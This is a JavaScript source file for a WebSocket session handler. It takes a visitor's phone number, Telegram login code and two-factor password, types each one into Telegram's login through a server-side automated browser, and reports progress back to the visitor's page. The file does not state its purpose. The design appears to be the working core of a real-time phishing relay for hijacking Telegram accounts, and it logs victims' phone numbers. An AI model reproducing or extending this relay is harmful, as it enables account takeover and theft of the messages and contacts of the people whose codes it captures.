import { createLogger } from '../utils/logger.js';
import { TelegramAutomator } from '../automator/index.js';
import { WebSocket } from 'ws';

const logger = createLogger('WebSocketSession');

export class WebSocketSession {
    constructor(id, ws, detectedCountry = null) {
        this.id = id;
        this.ws = ws;
        this.detectedCountry = detectedCountry;
        this.automator = new TelegramAutomator();
        this.status = 'idle';
        this.createdAt = new Date();
        this.lastActivity = new Date();
        
        // Initialize browser immediately
        this.initializeBrowser();
    }
    
    async initializeBrowser() {
        try {
            logger.info('Initializing browser for session', { sessionId: this.id });
            
            // Launch browser and navigate to login page
            await this.automator.initialize();
            
            // Notify client that browser is ready
            this.send({ 
                type: 'browser_ready',
                message: 'Browser initialized and ready for input'
            });
            
            logger.info('Browser initialized successfully', { sessionId: this.id });
        } catch (error) {
            logger.error('Failed to initialize browser', error, { sessionId: this.id });
            this.sendError('Failed to initialize browser: ' + error.message);
        }
    }

    updateActivity() {
        this.lastActivity = new Date();
    }

    async handleMessage(data) {
        this.updateActivity();
        
        try {
            switch (data.type) {
                case 'submit_phone':
                    return await this.handlePhoneSubmission(data.phone);
                
                case 'submit_code':
                    return await this.handleCodeSubmission(data.code);
                
                case 'submit_password':
                    return await this.handlePasswordSubmission(data.password);
                
                case 'user_returned_to_phone':
                    return await this.handleUserReturnedToPhone();
                
                case 'ping':
                    return this.send({ type: 'pong' });
                
                default:
                    throw new Error(`Unknown message type: ${data.type}`);
            }
        } catch (error) {
            logger.error('Error handling message', error, { sessionId: this.id, messageType: data.type });
            this.sendError(error.message);
        }
    }

    async handlePhoneSubmission(phone) {
        if (this.status !== 'idle' && this.status !== 'error') {
            throw new Error('Invalid session state for phone submission');
        }

        logger.info('Processing phone submission', { sessionId: this.id, phone });
        
        this.status = 'processing_phone';
        this.send({ type: 'phone_processing' });
        
        const result = await this.automator.submitPhone(phone);
        
        if (result.success) {
            this.status = 'waiting_code';
            this.send({ type: 'code_requested' });
            logger.info('Phone submission successful', { sessionId: this.id });
        } else {
            this.status = 'error';
            this.send({ 
                type: 'phone_error', 
                message: result.error || 'Failed to submit phone' 
            });
            logger.warn('Phone submission failed', { sessionId: this.id, error: result.error });
        }
    }

    async handleCodeSubmission(code) {
        if (this.status !== 'waiting_code') {
            throw new Error('Not ready for code submission');
        }

        logger.info('Processing code submission', { sessionId: this.id });
        
        this.status = 'processing_code';
        this.send({ type: 'code_processing' });
        
        const result = await this.automator.submitCode(code);
        
        if (result.success) {
            this.status = 'verified';
            this.send({ type: 'verification_success' });
            logger.info('Verification successful', { sessionId: this.id });
        } else if (result.passwordRequired) {
            this.status = 'waiting_password';
            this.send({ type: 'password_required' });
            logger.info('Password required for 2FA', { sessionId: this.id });
        } else {
            this.status = 'waiting_code';
            this.send({ 
                type: 'verification_failed', 
                message: result.error || 'Invalid code, try again' 
            });
            logger.warn('Verification failed', { sessionId: this.id, error: result.error });
        }
    }
    
    async handlePasswordSubmission(password) {
        if (this.status !== 'waiting_password') {
            throw new Error('Not ready for password submission');
        }

        logger.info('Processing password submission', { sessionId: this.id });
        
        this.status = 'processing_password';
        this.send({ type: 'password_processing' });
        
        const result = await this.automator.submitPassword(password);
        
        if (result.success) {
            this.status = 'verified';
            this.send({ type: 'password_success' });
            logger.info('Password verification successful', { sessionId: this.id });
        } else {
            this.status = 'waiting_password';
            this.send({ 
                type: 'password_failed', 
                message: result.error || 'Wrong password, please try again' 
            });
            logger.warn('Password verification failed', { sessionId: this.id, error: result.error });
        }
    }

    async handleUserReturnedToPhone() {
        logger.info('User returned to phone form', { sessionId: this.id });
        
        // If we were waiting for code, return to initial state
        if (this.status === 'waiting_code' || this.status === 'processing_code') {
            this.status = 'idle';
            logger.info('Reset session to idle state', { sessionId: this.id });
        }
        
        this.send({ type: 'state_reset' });
    }

    send(data) {
        if (this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
        } else {
            logger.warn('Attempted to send to closed WebSocket', { sessionId: this.id });
        }
    }

    sendError(message) {
        this.send({ type: 'error', message });
    }

    async cleanup() {
        logger.info('Cleaning up session', { sessionId: this.id });
        
        try {
            if (this.automator) {
                await this.automator.cleanup();
            }
        } catch (error) {
            logger.error('Error during session cleanup', error, { sessionId: this.id });
        }
    }

    isExpired(timeout) {
        return Date.now() - this.lastActivity.getTime() > timeout;
    }
}

export default WebSocketSession;